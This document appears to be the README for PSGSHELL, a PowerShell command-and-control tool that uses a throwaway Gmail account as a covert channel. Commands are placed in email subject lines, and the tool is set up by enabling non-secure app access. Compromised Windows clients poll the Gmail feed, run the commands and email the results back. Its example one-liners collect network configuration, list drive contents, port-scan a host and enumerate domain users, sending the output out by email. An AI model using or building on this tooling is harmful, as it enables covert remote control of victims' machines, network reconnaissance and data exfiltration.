# PSGSHELL

Setup:
Create a new gmail account for this and only this.
Allow non-secure apps

Both Scripts require that you set the email address and password variables at the top of the newly created gmail account.

Built for Powershell 2.0 (Win7) 

syntax is: 
To Return Output:

commander.ps1 '$variable = powershell oneliner; sendemail $variable ~host:host:host'

Without Returning output:

commander.ps1 'powershell oneliner ~host:host:host'


Examples: All One Liner commands

# Get IP address
.\commander.ps1 '$var = ipconfig /all; sendemail $var ~123434'

# List C drive contents and send them back to email
.\commander.ps1 '$var = get-childitem c:\; sendmail $var ~123434'

#port scan a host
.\commander.ps1 '$var = 1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "$_ is open"; sendemail $var ~123434'

# Get domain users (Net user /domain) but parsed for powershell output
.\commander.ps1 '$output = net user /domain;$output = $output[6..($output.length-3)];$output = $output -split "\s+" ;$output = $output | ? {$_}; sendemail $output ~123434'

# How it Works
This script utilizes the GMAIL rss feed "https://mail.google.com/mail/feed/atom" and parses the subject lines of the emails. 
The '~' is the delimiter between the powershell command at the front of the subject and the client names at the end.

.\commander.ps1 '$var = ipconfig /all; sendemail $var ~123434:343454:32233'

Currently the script accepts a single input that is the PS ONELINER, an optional sendmail, followed by the '~' and then $client_names which there can be multiple but should be seperated by colons.
